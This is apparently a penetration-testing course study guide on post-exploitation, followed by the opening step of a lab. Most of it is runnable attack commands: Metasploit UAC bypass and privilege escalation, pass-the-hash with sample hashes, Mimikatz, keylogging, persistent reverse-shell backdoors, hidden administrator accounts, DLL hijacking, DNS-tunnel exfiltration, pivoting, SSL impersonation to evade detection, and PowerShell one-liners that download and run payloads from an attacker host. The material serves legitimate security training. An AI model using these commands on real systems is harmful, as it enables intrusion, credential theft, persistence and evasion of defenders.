# Network Security

## Post Exploitation

### Introduction - Study Guide

(01/13) Penetration testing process:
1. Information Gathering
2. Scanning
3. Enumeration
4. Sniffing
5. Vulnerability Assessment
6. Exploitation
7. Post Exploitation.

(05/13) Never forget about the rules of the engagement.
You should always keep track of the actions (changes) taken against the compromised machines.
Data gathered must be protected (encrypted) and deleted once the pentest is complete, changes must be instead reverted.

(11/13) Post Exploitation (cyclic) process:
- Privilege Escalation and Maintaining Access
- Data Harvesting
- Internal Network Scan
- Exploitation of new systems and Pivoting.

### Privilege Escalation and Maintaining Access - Study Guide

(004/158) *Privilege Escalation*: is an attack that exploits operating system or third-party software vulnerabilities in order to elevate the current access (privilege) to protected resources.
Vertical: from a lower to a higher privileged user. Horizontal: assume the identity of a different user, same level of privileges.
Assume we already have a meterpreter session on the target. We will make sure that this session is:
- Stable (not get dropped)
- Privileged (with high privileges)
- Persistent (through reboots).

(012/158) *Stable*: we need to remember that the victim can kill the exploited process (session). To avoid this we can *migrate* the session to another process:
`getpid`, `run post/windows/manage/migrate`, `getpid`: to automatically migrate to another process (default, notepad.exe), or `migrate 2148`: to migrate our session to a different process (in this case the Service Host) in order to hide our session.

(020/158) *Windows Privilege Escalation*.
`getsystem`: will automatically find and use all the best techniques to elevate privileges (to `System`). Note that it will fail if UAC (User Account Control) is enabled and we do not have the high (`Admin`) privileges.
`run post/windows/gather/win_privs`: to verify the current user privileges and if UAC is enabled.
`search uac`, `use exploit/windows/local/bypassuac_vbs`, `sessions`, `set SESSION 1`, `exploit`: in order to bypass UAC (just bypass, not disable it) and get a new Meterpreter session with higher privileges.
`getsystem`: to get the highest (`System`) privileges.
The getsystem is a meterpreter command for privilege escalation. It uses pre-defined methods to gain the highest privilege (i.e. SYSTEM) on the compromised machine.
- 0: All techniques available
- 1: Named Pipe Impersonation (In Memory/Admin)
- 2: Named Pipe Impersonation (Dropper/Admin)
- 3: Token Duplication (In Memory/Admin)
- 4: Named Pipe Impersonation (RPCSS variant).

(031/158) *Incognito*: `use incognito`, `list_tokens -u`, `impersonate_tokens els\\els`: to impersonate other existent users on the machine (without cracking the passwords), giving the possibility to access different local or domain resources.

(035/158) *Unquoted Service Paths*: is a method we can use for either persistence or for escalating our privileges, depending on the circumstance. In this method we abuse the way (the search oder) that Windows searches for executables belonging to a service. The issue arises when a service binary is unquoted and contains spaces in its executable path (e.g. `C:\Program Files (x86)\Canon\IJ Scan Utility\SETEVENT.exe`). We can exploit this vulnerability to force the service to laungh the malicious executable (which runs a reverse TCP shell for instance) rather than of the original one.
`wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """`: searches for service binary paths which are unquoted.
`use exploit/windows/local/trusted_service_path`: to automatically exploit unquoted path-vulnerable instances of services.
`sc qc AdobeARMservice`: to manually check for an unquoted path.

(044/158) *Linux Privilege Escalation*.
The best way to proceed is by getting information about the current OS and then searching for publicly available exploits. Note that privilege escalation exploits are very OS specific.

(063/158) *Maintaining Access*: we want to make our presence on the target machine *persistent*, creating a backdoor readily available for later use.

(074/158) *Password hash*.
`run hashdump`: to recover the password hashes.
Now that we have the password hashes, we can try to crack them or we can use the *pass-the-hash* technique: it allows to use LM/NTLM hashes (without using the actual plaintext password) to authenticate to a remote machine.
`use exploit/windows/smb/psexec`, `set PAYLOAD windows/meterpreter/reverse_tcp`, `set SMBUSER <Username>`, `set SMBPASS <LMHash>:<NTLMHash>`, `set RHOST <TargetIP>`, `exploit`: to run the attack. Note that this attack only works with an administrator account.
If our current user is in the administators group, but it is not the actual administrator (RID-500), we can get a `STATUS_ACCESS_DENIED` error. To avoid this we need to set a registry entry: `reg setval -k HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -v LocalAccountTokenFilterPolicy -t REG_DWORD -d 1`: to allow non RID-500 user accounts to successfully pass the hash. `reg setval -k HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanManServer\Parameters -v RequireSecuritySignature -t REG_DWORD -d 0`.

We can also use the LM/NTLM hashes to log onto a Remote Desktop service: `xfreerdp /u:<Username> /d:<DomainName> /pth:<NTLMHash> /v:<TargetIP>`.

(093/158) *Mimikatz* is a tool to extract plaintext passwords (but also Kerberos tickets) from an exploited machine, and it can also perform pass-the-hash attacks.
Note that for loading all the features of this tool we need to have the Meterpreter session running on a 64-bit process. To migrate the Meterpreter session: `sysinfo`, `ps -A x86_64 -s`: where `-A` specifies the architecture and `-s` lists only SYSTEM processes, `migrate <64BitPID>`, `sysinfo`.
`load mimikatz`, `wdigest`: to retrieve LM/NTLM hashes.

(103/158) *RDP service*.
`shell`, `net start`: to check the enabled services, or we can also use: `run post/windows/gather/enum_services`.
`wmic service where 'Caption like "Remote%" and started=true' get Caption`: to check if a specific service is enabled.
`run getgui -e`: to enable RDP for the current user. Note that we need to check if the current user belongs to Remote Desktop Users group. `shell`, `net localgroup "<GroupName>" <Username> /add`: to add the user to a specific group (e.g. `net localgroup "Remote Desktop Users" els /add`).
`net localgroup`: to list the groups, `net localgroup "<GroupName>"`: to list the users of a specific group.
`rdesktop <TargetIP> -u <Username> -p <Password>`: to try to establish an RDP connection to the target machine.

We can also use the `net` command for granting administrators privileges to standard users: `net localgroup "Administators" <Username> /add`.

(119/158) *Backdoor*: a reverse shell that persists through reboots of the target machines.
The reverse shell will try to automatically connect to the attacker machine at every reboot.
We can use free DNS services to hide the connection to a specific IP address at every boot. 

`run persistence -A -X -i <AttemptInterval> -r <AttackerIP> -p <AttackerPort>`: to get persistence through the use of a backdoor, where `-A` starts the Handler to connect to the agent, `-X` specifies to start the agent at boot (requires SYSTEM privileges), `-i` specifies the connection attempt interval in seconds.

The steps performed by the script are the following: creates the backdoor, uploads it and sets the registry keys to start it at boot.
Note that `persistence` script only works against Windows machines.

(132/158) *Manual installation*: instead of using automate persistence script we can also manually modify the Windows Registry keys entries to assure persistence for our backdoor.

(135/138) We can also add hidden new users with administrative privileges as follows:
`net user <Username> <Password> /add`, `net localgroup "Administrators" <Username> /add`: to create a new administator user.

(138/158) *DLL Hijacking* is a way to abuse a built-in behavior in the way that executables, when launched, search for DLL (Dynamic Link Libraries) to import, known as DLL search order:
1. The directory from which the application was launched
2. The C:\Windows\System32 directory
3. The 16-bit Windows system directory (i.e, C:\Windows\system)
4. The Windows directory (C:\Windows)
5. The current directory at the time of execution
6. Any directories specified by the %PATH% environment variable

Using this technique we can ensure that our malicious DLL payload is executed in the place of the original one.
The process for DLL Hijacking is the following:
1. Create a procmon (Process Monitor) filter for a specific executable we'd like to investigate ('Process Name is <ProcessName>.exe') and also create a filter for `NAME NOT FOUND` for the `Result` column ('Result is NAME NOT FOUND'). We can also create other filters to shrink the search ('Operation is CreateFile' and 'Path begins with <ProcessPathParent>').
2. Identify cases where the application is looking for a DLL in a directory which we can modify/write to.
3. Drop our modified malicious DLL payload.
4. Restart the service, re-launch the application, or wait for the system reboot.

To verify that the current user has the privileges to write in the process directory: `Get-ACL '<ProcessPath>' | Format-List`.

### Privilege Escalation - Video

Metasploit:
Assume we already have a Meterpreter session (reverse shell).
`sysinfo`: we have a Windows 10 machine, `getsystem`: not working, `run post/windows/gather/win_privs`: not admin - not system - UAC enabled, `background`, `search uac`, `use exploit/windows/local/bypassuac_injection`, `show options`, `set SESSION 1`, `show targets`, `set TARGET 1`, `set PAYLOAD windows/x64/meterpreter/reverse_tcp`: if we do not select the correct version (x64) the exploitation will fail, `exploit`: to create a new Meterpreter session with higher privileges.
`run post/windows/gather/win_privs`: is admin - not system - UAC enabled, `getsystem`: to get also the system privileges (the highest privileges on Windows), `getuid`: `NT AUTHORITY\SYSTEM`.
If no one of the UAC bypass modules work, we can use other tools, like UACME.

UACME:
`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.3 LPORT=1234 -f exe -o /root/reverse_tcp64.exe`, `cd ~/tool/UACME`.
Go back to Meterpreter and interact with the (low privileges) open session: `sessions -i 1`, `upload /root/reverse_tcp64.exe .`, `upload ~/tools/UACME/Akagi64.exe .`, `background`.
Let's create the handler for the payload: `use exploit/multi/handler`, `set PAYLOAD windows/x64/meterpreter/reverse_tcp`, `set LHOST 192.168.1.3`, `set LPORT 1234`, `exploit -j`: to execute the Handler in the background.
Go again back to Meterpreter and interact with the (low privileges) open session: `sessions -i 1`, `shell`, `dir`, `Akagi64.exe 10 C:\Users\els\Download\reverse_tcp64.exe`: where `10` specifies the number of the exploit method.
A new Meterpreter session has been created, in which we have higher privileges: `sessions`, `sessions -i 3`, `run post/windows/gather/win_privs`: is admin - not system - UAC enabled, `getsystem`: to get also the system privileges (the highest privileges on Windows), `getuid`: `NT AUTHORITY\SYSTEM`.

`exit`, `sessions -K`, `jobs -K`, `exit`: to clean all sessions and jobs.

Let's try with a Linux machine.
Assume we already have a Meterpreter session (reverse shell).
`sysinfo`: we have a Linux (ubuntu 14.04.1, i686 architecture) machine, `getuid`: we have root privileges.
On Metasploit we do not have modules to automatically get root privileges, so we have to search online for Linux privilege escalation exploits: `ubuntu 14.04 privilege escalation`, download the (C file) exploit.
Let's go back on the Meterpreter session to open a shell: `execute -f /bin/sh -i -c`: where `-i` specifies we want to interact with the shell, `-c` to channelize the inputs/outputs, `gcc --version`: to see if the target machine has the compiler installed, `upload exploit.c ~/Desktop/privesc_exploit.c`, `gcc privesc_exploit.c -o privesc_exploit`, `whoami`, `./privesc_exploit`, `whoami`: the exploitation is successful, so we are root.

### Exploiting Unquoted Service Paths - Video

Unquoted service paths are a Windows vulnerability we can exploit to escalate our privileges or to persistence.
Assume we already have a Meterpreter session (reverse shell) with a low privileges user.

`shell`, `wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """`: to identify a vulnerable service, `sc stop VGAuthService` `sc start VGAuthService`: to check if the current user has the privileges to start/stop the vulnerable service, `sc qc VGAuthService`: to check if the service will start with system privileges (`SERVICE_START_NAME : LocalSystem`), `sc stop VGAuthService` `cd C:\Program Files\Vmware` `icacls "Vmware Tools"`: to check we have the permissions to write the directory of the new payload (`Authenticated Users:(OI)(CI)(M)`).

Now, once created the reverse shell payload with Mfsvenom, we can upload it. `CTRL+Z`: to send the shell in the background, `upload /root/reverse_tcp64.exe "C:\\Program Files\\Vmware\\Vmware Tools\\Vmware.exe"`, `background`.
Let's create the handler for the payload: `use exploit/multi/handler`, `set PAYLOAD windows/x64/meterpreter/reverse_tcp`, `set LHOST 192.168.1.3`, `set LPORT 1234`, `exploit -j`: to execute the Handler in the background.

Now, it is time to start the service that will execute the reverse shell payload with system privileges: `sessions`, `sessions -i 1`, `shell`, `sc start VGAuthService`, so we have a new Meterpreter session, `CTRL+Z`, `background`, `sessions -i 2`, `getuid`: we will notice that we get an error, indeed our session process is unstable.

To remedy this we need to launch the Handler with an option: `background`, `use exploit/multi/handler`, `set PAYLOAD windows/x64/meterpreter/reverse_tcp`, `set LHOST 192.168.1.3`, `set LPORT 1234`, `set AutoRunScript migrate -n svchost.exe` `exploit -j`.
The option `AutoRunScript` is used to automatically run a script when the new session is established, and in this case we have to `migrate` (and hide) the session to a typical Windows process (Service Host) that is responsible for executing system services.

Let's start the service again to have a new (stable) Meterpreter session: `sessions`, `sessions -i 1`, `shell`, `sc start VGAuthService`, so we have a new Meterpreter session, `CTRL+Z`, `background`, `sessions -i 3`, `run post/windows/gather/win_privs`: is admin - is system - UAC enabled, `getuid`: `NT AUTHORITY\SYSTEM`.

### Maintaining Access - Video

Assume we already have a Meterpreter session (reverse shell) with a high privileges user: `getuid`: `NT AUTHORITY\SYSTEM`.

We want to make the current session stable.
`getpid`: to get the PID of the current session (if the victim terminates this process we will lose our session), `ps`: to see all the running processes on the exploited machine, `migrate 2148`: to migrate our session to a different process (in this case the Service Host) in order to hide our session.

Let's get the password hashes from the victim with the `hashdump` Metepreter module or with `run post/windows/gather/smart_hashdump` that automatically saves the dumped hashes (into `/root/.msf5/loot` folder).
`background`, `loot` `creds`: to get the just gathered credentials.

Let's try to exploit the machine via "pass-the-hash" technique in order to have persistence.
`use exploit/windows/smb/psexec`, `show options`, `set RHOST 192.168.1.2`, `set SMBUser els`, `set SMBPass E52CAC67419A9A224A3B108F3FA6CB6D:8846F7EAEE8FB117AD06BDD830B7586C`, `exploit`: it will generate the error `STATUS_ACCESS_DENIED` because we do not have access to administrative shares (a security restriction).
We need to set a registry entry: `reg setval -k HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -v LocalAccountTokenFilterPolicy -t REG_DWORD -d 1` in order to allow `psexec` to authenticate using credentials with local administrative privileges even when access to administrative shares is not available. `exploit`.

Now, we have a persistence access to the victim machine.
Note that if the user changes password, we will lose our access. In order to avoid this, we can create a new (hidden) user: `sessions -i 1`, `run getgui -e -u atk -p atk`: to create a new user, where `-e` enables RDP. Note that the script automatically creates a rule in the firewall.
We can check if RDP is correctly enabled by `xfreerdp /v:192.168.1.2 /u:atk /p:atk` that establishes a RDP (GUI) connection.

Let's create and install a (very simple) backdoor in the target machine with Metasploit: `background`, `search persistence`, `use exploit/windows/local/persistence`, `show options`, `set SESSION 1`, `set STARTUP SYSTEM` (since we have system privileges), `set PAYLOAD windows/meterpreter/reverse_tcp`, `set LHOST 192.168.1.3`, `set PORT 1234`, `exploit`: will install the backdoor to the target machine.

In this case we are using a random port, but during real penetration tests we will use 80 or 443.
The same for the IP address, we are using a private IP address because we are in the same LAN of the victim, but in real penetration test scenarios we will use a public IP address.

Now, everytime we want to connect back on this machine, we just need to set up the Handler module with the provied IP address and port, since this backdoor will persist even after a reboot.

### DLL Hijacking - Video

Process Explorer tool (present in the Microsoft Sysinternals Suite):
`Select Columns->User Name->OK`: to help us identifying a privilege process (`NT AUTHORITY\SYSTEM`).
`Select Columns->Image Path->OK`: to help us identifying the binary path.

Process Monitor tool (present in the Microsoft Sysinternals Suite):
It provides us information about what the operating system is doing in real time: registry key accesses, threads being created, images being loaded.
`Filter (CTRL+L)`: to add filters, `Process Name is RegSrvc.exe`, `Add`, `OK`.

We can use the Windows Services applet to stop and start the target service.

In the Process Monitor tool, we can see that when the service starts, many DLLs are loaded. In the `Result` column we can see many DLLs are not found (`NAME NOT FOUND`). This are a mark for understand the DLLs loading order.
We can exploit this mechanism to insert a malicious DLL in one of the directories the OS tried to access the service DLL without success.
`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.3 LPORT=1234 -f dll -o payload64.dll`: to create the malicious DLL, now we need to copy the malicious DLL to the choosen directory, changing its name to `CRYPTBASE.dll`.

Let's create the handler for the payload: `use exploit/multi/handler`, `set PAYLOAD windows/x64/meterpreter/reverse_tcp`, `set LHOST 192.168.1.3`, `set LPORT 1234`, `exploit -j`: to execute the Handler in the background.

Now, we just need to stop and start the target service to get a Meterpreter session.
In the Process Explorer tool we can see that `RegSrvc.exe` service has spawn a `rundll32.exe` child process, and into its properties we can see that it has TCP connection established with our attacker machine.

### Pillaging - Study Guide

(03/72) *Data Harvesting aka Pillaging* is the step in which access sensitive data and intellectual property if the target organization. Get as much information as we can: system info, applications, services, networks, documents, messaging.

`sysinfo`: get basic information about the system. `shell`, `systeminfo`: to get more information (software and hardware) about the system.
`getuid`: check current user privileges.
`run post/windows/gather/enum_services`: to get a list of all the services running on the target machine.
Remember that the post exploitation modules can be also configured and used outside the Meterpreter session.
Note that we can obtain the same results using a well-defined set of proper OS commands (e.g. `wmic service get Caption,StartName,State,PathName`).
`ps`: to get a list of all the processes running on the target machine.

`net view /domain`, `run post/windows/gather/enum_domains`: to get the domain and the domain controller names.
`net user` (Windows) and `cat /etc/passwd` (Linux): to get a list of the users on the system.
`net localgroup`: to get all the available groups, `net localgroup <GroupName>`: to get all the users belonging to a specific group.
`net share` or `run enum_shares`: to see all the resources shared.

`scraper` and `winenum` are two Metasploit scripts we can use to automatically retrieve system information from Windows Machines.
Online we can get a list of all the available post exploitation commands.

`screenshot`: to get the screen of the victim.
To get sensitive information we can also use a keylogger. 
`keyscan_start`, `keyscan_dump`, `keyscan_stop`: to use the keylogger.
Note that depending on the process we are attached to (if it runs on system or on user level), different keystrokes can be logged (we need first migrate).
`keylogrecorder` is another script that can be instructed on the type of key to capture (user or winlogon, it automatically migrates).

There are some Meterpreter commands to search files, list files, create files and folders, move between directories and so on (e.g `search -d C:\\Users\\els\\ -r -f *.kdbx`: to search in a specific directory (and sub directories) a specific file pattern (e.g. KeyPass credentials file), `getwd`: to print the working directory).

(53/76) *Credentials*.
All the available modules can be found under `post/windows/gather/credentials`, but also in the `post/windows/gather` directory.
`run post/windows/gather/enum_chrome`: to gather (and try to decrypt) the credentials stored in Chrome.

(62/72) *DNS Tunneling* is the use of DNS for data exfiltration.
This is done due to the fact that many organizations are not logging or alerting on anomalous DNS traffic. Usually in this case, the Internet access is blocked except for the DNS traffic, so we need to find a way to connect our tester machine to the organization one.
*Iodine* is a tool to tunnel all our traffic through an SSH socks server, completely over DNS, bypassing firewalls and any proxies (for those organizations that restrict the internet access due to authenticated proxies for which we do not have credentials) along the way.
As pre-requisites we need a domain name (we need control over its DNS configuration) registered with GoDaddy and an IP address (that acts as the authoritative Name Server for the domain name, for which we have SSH access to as well) hosted on a VPS provider.

DNS Tunneling requires a client/server model, in which the client is the attacker machine (DNS tunnel client component) and the server is an attacker-controlled DNS server (DNS tunnel server component).
The traffic is encoded (at the client) in the form of DNS queries (typically as TXT records), and then decoded at the other end (server).

### Bypassing Firewalls and Data Exfiltration with DNS Tunneling - Video

Through the `DNS Management` settings of the domain (GoDaddy one) we control, we can configure two host names (`ns1` and `ns2`: DNS name servers) mapped to the IP address (e.g. `104.131.12.224`) of a virtual server we control (DigitalOcean Droplet). These two name servers will be used as DNS authoritative servers for the domain, modifying the `Nameservers` settings (e.g. `ns1.cyberallthethings.com`, `ns2.cyberallthethings.com`).
So, we created two domain name servers for a domain that we control, and have pointed them to the DigitalOcean Droplet IP address that we control as well.

`iodined -u <JustDefinedUsername> -P <Password> <ServerTunnelIP> <DNSNameServer> -f` (e.g. `iodined -u nobody -P 'qwerty1234' -f 10.0.0.1 ns1.cyberallthethings.com`): to run the tunnel endpoint on the server (attacker-controlled DNS server), ready to receive a DNS connection from the Iodine client (attacker machine), where `-u <JustDefinedUsername>` is to ensure our deamon is not running as root. This will create a new network interface `dns0` associated to the just defined `<ServerTunnelIP>` IP address (e.g. `10.0.0.1`).

Let's check if the Internet access is blocked except for the DNS traffic.
`nc www.google.com 80`: it fails or times out, so HTTP traffic is blocked.
`cat /etc/resolv.conf`: to check if we are allocated to a DNS server (usually this is an automatic network configuration).
`ping www.google.com -c 3`: to see if the DNS resolver can resolve a host on the Internet. In our case we cannot ping but the domain name is resolved to its IP address, so ICMP traffic is blocked but the DNS traffic is not (over UDP).

Let's see if we can tunnel some data over DNS.
`iodine -P <Password> <DNSNameServer> -T CNAME -r -f` (e.g. `iodine -P 'qwerty1234' ns1.cyberallthethings.com -T CNAME -r -f`): where `-T` to specify the DNS record type to use, `-r` to disable raw UDP mode, `-f` to keep the client running in background. `ifconfig`: to check the network interfaces, with a new `dns0` interface associated to a new (tunnel) IP in the same range (e.g `10.0.0.2`) of the server `<ServerTunnelIP>` IP address.

If everything goes well, we will have an active DNS tunnel through our local DNS resolver to our DNS server (tunnel endpoint).
We can use Wireshark to capture and analyze the DNS traffic using the following filter: `dns`.

Now, we can create a local SSH socks proxy server (so our traffic is encrypted, providing an extra layer of security) by connecting to the remote tunnel IP address (e.g. `10.0.0.1`).
`ssh <Username>@<ServerTunnelIP> -D<ClientTunnelIP>:<LocalPort> -N -C` (e.g. `ssh user@10.0.0.1 -D 10.0.0.2:1234 -N -C`): where `-D` to create a local port we will use for our socks proxy, `-C` to enable compression to help with transfer speed.

We can configure our browser to use our local SSH socks server IP address (e.g. `10.0.0.2`) to make the HTTP/HTTPS traffic go through the DNS tunnel in the browser `Proxy Configuration` settings (e.g. `SOCKS Host: 10.0.0.2`, `SOCKS Port: 1234`).
Now, if we go to `www.ipinfo.io` we will see the IP address of the DigitalOcean Droplet (e.g. `104.131.12.224`).

### Mapping the Internal Network - Study Guide

(03/59) The main purpose is to find other exploitable machines in the organization internal network. So we use the first exploitated machine (the ingress point) as a *bridge*.

`ipconfig /all` (Windows) or `ifconfig` (Linux) or `ifconfig` (Meterpreter): to see the network interfaces (and find other subnets).
`route print` (Windows) or `route -v` (Linux) or `route` (Meterpreter): to see the IP routing tables.
`arp`: to see the host ARP cache.
`netstat -an`: to see all the active host connections and all the associated processes.
`run arp_scanner -r <TargetNetwork>`: to detect the other hosts on the internal network.
`use post/multi/gather/ping_sweep`, `show options`, `set RHOSTS <TargetNetwork>`, `set SESSION 1`, `run`: to find the alive hosts.
`netenum` is another powerful Meterpreter script to enumerate the internal network.
We need to keep track of our findings, in order to start summarizing an internal network map.

(26/59) *Pivoting*: use the ingress point for lateral movements towards other machines of the internal network.
Remember that these (unexposed) hosts are not directly reachable from the attacker machine.

`route add <TargetNetwork> <NetworkSubmask> <SessionID>` (e.g. `route add 10.10.10.0 255.255.255.0 2`) or `run autoroute -s <TargetNetwork>` (e.g. `run autoroute -s 10.10.10.0/24`): to use the exploited machine (through our Meterpreter session) as a *router* for our communication with the organization internal network, so from the Meterpreter session to the target (internal) machine.
`run autoroute -p`: to check the current routing table.
`use auxiliary/scanner/portscan/tcp`, `show options`, `set RHOSTS <TargetNetwork>`, `run`: to run a TCP port scan on an internal IP addresses range, through the ingress point.
`route flush`: to flush the routes, if we need to.

(41/59) Sometimes we may want to pivot external tools through the Meterpreter session and its routes.
`use auxiliary/server/socks4a`, `show options`, `set SRVHOST 0.0.0.0`, `set SRVPORT 1080`, `run`: to set up a socks4a proxy within Metasploit.
`netstat -tulpn | grep 1080`: to check the proxy status (in this case we are listening for incoming connections on port 1080).
*Proxychains* is a tool to force TCP connections, made by any application (for instance Nmap or Nessus), to follow through proxy like SOCKS, TOR, and so on.
To use socks4 as proxy: `nano /etc/proxychains4.conf`:
```
[ProxyList]
# add proxy here ...
# meanwhile
# defaults set to "tor"
socks4		127.0.0.1	1080
```
`proxychains4 nmap -sT -Pn -n <TargetInternalIP> --top-ports <PortsAmount>`: to use an external tool through the Meterpreter session and its routes.
We can also use proxychains in order to establish connections to services running on machines within the target network: `proxychains4 ssh <Username>@<TargetInternalIP>`.
Moreover, we can run exploits through proxychains.

(52/59) Alternatively, we can use *portfwd* Meterpreter script to achieve the same purpose.
`portfwd add -l <LocalPort> -p <TargetInternalPort> -r <TargetInternalIP>`: to open a listener on our local IP address on `<LocalPort>` port and forward the connection to the target (internal) IP address on `<TargetInternalPort>` port.
`netstat -tulpn | grep 3333`: to check proxy status (we are listening for incoming connections on port 3333).
Now, we can try to establish an RDP session with the target (internal) machine: `rdesktop 127.0.0.1:3333`.

Note that thanks to this configuration, we are able to route packets to networks behind NAT or firewalls.

### Mapping the Network - Video

`shell`, `ipconfig /displaydns`: to show the local DNS cache, so the DNS records stored. Here we can see that exists another subnet `10.10.11.0/24`.
`netstat -an`: to see all the active TCP connection ports on which the computer is listening.

`use post/multi/gather/ping_sweep`, `show options`, `set RHOSTS 10.10.10.0/24`, `set SESSION 1`, `run`: to find the alive hosts.
`sessions -i 1`, `run arp_scanner -r 10.10.10.0/24`: to detect the other hosts on the internal network.

Now, the victim will work as a proxy between us and the remote network.
`background`, `use /post/windows/manage/autoroute`, `show options`, `set SUBNET 10.10.10.0`, `set SESSION 1`, `run`, `autoroute -p`: to add a route.
`use auxiliary/scanner/portscan/tcp`, `show options`, `set RHOSTS 10.10.7.0/32`, `set PORTS 20-200`, `set THREADS 20`, `run`: to run a TCP port scan on an internal IP addresses range, through the ingress point. Note that `10.10.7.0/32` stands for the only `10.10.7.0` IP address.
`set RHOSTS 10.10.10.200`, `run`: we can see that SSH and HTTP ports are open.

All the traffic that goes through the proxy will use the route added before in Metasploit.
`use auxiliary/server/socks4a`, `show options`, `run`.
`nano /etc/proxychain.conf`:
```
[ProxyList]
# add proxy here ...
# meanwhile
# defaults set to "tor"
socks4		127.0.0.1	1080
```
`proxychains4 ssh root@10.10.10.200`: to establish a connection to the SSH server in the remote network.
`proxychains4 firefox`: to run a web browser with proxychains and try to navigate to `10.10.10.200`. It works.
Let's clean the pivoting configuration: `jobs -K`, `route flush`.

Let's try to add a port forwarding rule between our local machine and the exploited box.
`portfwd add -l 8080 -p 80 -r 10.10.10.200`: to create a binding.
Now we can try to access to the web server on the exploited box using our local browser navigating to the address `127.0.0.1:8080`.

### Exploitation Through Pivoting - Study Guide

(06/16) Once we have captured the LM/NTLM password hashes, if the same user with the same password exists on other machines, we should be able to get access to all of them through the pass-the-hash technique.
Once exploited a new (internal) host, we can start over the Post Exploitation process.

### Exploitation via Pivoting - Video

Assume we already have exploited the victim1 (`10.10.10.15`) in the subnet1 (`10.10.10.15/24`).
1. Scenario 1: we want that the victim2 (`10.10.11.11`) present in the subnet2 (`10.10.11.0/24`), connects with our attacker machine (`66.176.44.100`) through a reverse connection. This is possible if the subnet2 can communicate with the Internet.
2. Scenario 2: suppose that the subnet2 cannot communicate with the Internet, but it can communicate with the victim1. In this case, we will configure the pivoting attack in order to forward all the communication through the Meterpreter session on victim1.
In particular, we want to exploit the victim2 machine through pass-the-hash technique.

1. Scenario 1:
`background`, `use /post/multi/manage/autoroute`, `show options`, `set SUBNET 10.10.11.0`, `set SESSION 1`, `run`, `autoroute -p`: to add a route to the subnet2.
`use exploit/windows/smb/psexec`, `set PAYLOAD windows/meterpreter/reverse_tcp`, `set SMBUSER <Username>`, `set SMBPASS <LMHash>:<NTLMHash>`, `set LHOST 66.176.44.100`, `set RHOST 10.10.11.11`, `exploit`: to run the attack. Now we have a direct connection established between our attacker machine and the victim2.

2. Scenario 2:
We want to configure a proxy pivoting attack, in order to run exploits on machines that we cannot reach from external networks.
`background`, `use /post/multi/manage/autoroute`, `show options`, `set SUBNET 10.10.10.0`, `set SESSION 1`, `run`, `autoroute -p`: to add a route to the subnet1.
`use exploit/windows/smb/psexec`, `set PAYLOAD windows/meterpreter/reverse_tcp`, `set SMBUSER <Username>`, `set SMBPASS <LMHash>:<NTLMHash>`, `set LHOST 10.10.10.15`, `set RHOST 10.10.10.15`, `exploit`: to run the attack. Now we have a direct connection established between the victim1 and the victim2.

### Meterpreter SSL Certificate Impersonation and Detection Evasion - Video

ServerHello packet contains SSL certificate information and it is passed to the client in clear text over the wire. It is these randomly generated (by Metasploit with default Meterpreter options) SSL certificate strings that will likely flag our payload as suspicious traffic and potentially disrupt our operations.

In regards to Meterpreter and payloads, we can configure our own SSL certificates for our own payloads and handler, which will encrypt our traffic making it harder to detect on the wire.

There are options we can use to reduce our chances of being detected.
The following module will request a copy of an SSL certificate from a site of our choosing (e.g. `www.microsoft.com`), will create and output a self-signed version of the certificate and the associated private key we can then use to configure our payload and handler with.

`search impersonate_ssl`, `use auxiliary/gather/impersonate_ssl`, `show options`, `set RHOST www.microsoft.com`, `run`: to create the .crt certificate file, the associated .key private key and a .pem combined file.
`use payload/windows/x64/meterpreter/reverse_https`, `show options`, `set LHOST 192.168.1.3`, `set LPORT 443`, `set HANDLERSSLCERT <PEMFilepath>`, `set STAGERVERIFYSSLCERT true`, `generate -t exe -f /root/ssl_payload64.exe`: to create the SSL payload.

`use exploit/multi/handler`, `show options`, `set LHOST 192.168.1.3`, `set LPORT 443`, `set HandlerSSLCert <PEMFilepath>`, `set StagerVerifySSLCert true`, `set PAYLOAD windows/x64/meterpreter/reverse_https`, `exploit -j`: to run the handler.

`python -m SimpleHTTPServer 80`: to run a simple HTTP server, that we can then use to serve it to the target machine.
`(New-Object Net.WebClient).DownloadFile('http://192.168.1.3/ssl_payload.exe', 'C:\ssl_payload.exe')`: to download the SSL payload on the target machine.

Now we can check the SSL certificate strings of the ServerHello packet with Wireshark.

### Obtaining Stored Credentials with SessionGopher - Video

*SessionGopher* is a PowerShell script to gather credentials that are stored locally by applications such as WinSCP, Putty, RDP, and so on.
`wget https://raw.githubusercontent.com/Arvanaghi/SessionGopher/master/SessionGopher.ps1`: to download the script to the attacker system.
`python -m SimpleHTTPServer 80`: to run a simple HTTP server, that we can then use to serve it to the target machine.
`powershell.exe -nop -ep bypass -C iex (New-Object Net.WebClient).DownloadString('http://192.168.13.71/SessionGopher.ps1'); Invoke-SessionGopher`: to run SessionGopher on the target machine.
This is done to reduce our footprint and help to evade detection mechanisms.

### Post-Exploitation - Lab

You will learn to find and exploit a vulnerable application in this lab. It will also cover post-exploitation techniques to extract sensitive information and pivot!

In this lab environment, the user will access a Kali GUI instance. A vulnerable application can be accessed using the tools installed on Kali on http://demo.ine.local and http://demo1.ine.local

Objective: Exploit both the target and find the flag!

The best tools for this lab are:
- Metasploit Framework
- Nmap

Please go ahead ONLY if you have COMPLETED the lab or you are stuck! Checking the solutions before actually trying the concepts and techniques you studied in the course will dramatically reduce the benefits of a hands-on lab!

---

**Step 1**.

`for host in demo.ine.local demo1.ine.local; do ping $host -c 3; done`:
```
PING demo.ine.local (10.4.20.158) 56(84) bytes of data. ←
64 bytes from demo.ine.local (10.4.20.158): icmp_seq=1 ttl=125 time=9.75 ms
64 bytes from demo.ine.local (10.4.20.158): icmp_seq=2 ttl=125 time=7.95 ms
64 bytes from demo.ine.local (10.4.20.158): icmp_seq=3 ttl=125 time=7.97 ms

--- demo.ine.local ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2003ms ←
rtt min/avg/max/mdev = 7.949/8.555/9.751/0.845 ms
PING demo1.ine.local (10.4.19.156) 56(84) bytes of data. ←

--- demo1.ine.local ping statistics ---
3 packets transmitted, 0 received, 100% packet loss, time 2050ms ←
```

